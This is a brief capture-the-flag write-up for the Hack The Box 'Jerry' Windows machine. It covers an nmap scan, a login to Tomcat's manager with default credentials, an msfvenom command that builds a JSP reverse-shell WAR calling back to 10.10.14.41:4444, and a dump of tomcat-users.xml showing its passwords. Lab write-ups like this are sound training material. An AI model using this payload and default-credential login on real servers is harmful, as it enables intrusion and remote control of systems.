---
title: HTB Jerry
author: kei5uke
draft: true
description: Writeup for HTB Jerry
tags:
  - windows
  - writeup
---

# Nmap

```bash
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat

```

# HTTP 8080

`tomcat:s3cret`

Upload war file: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.41 LPORT=4444 -f war > reverse.war`

# Shell as

```bash
C:\apache-tomcat-7.0.88\conf>type tomcat-users.xml
type tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>
<tomcat-users>
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="s3cret" roles="tomcat, manager-gui, manager-script, manager-jmx, manager-status"/>
  <user username="admin" password="admin" roles="role1, manager-status"/>
  <user username="jerry" password="tomcat" roles="role1, manager-status"/>
</tomcat-users>

```

```bash
type "2 for the price of 1.txt"
```
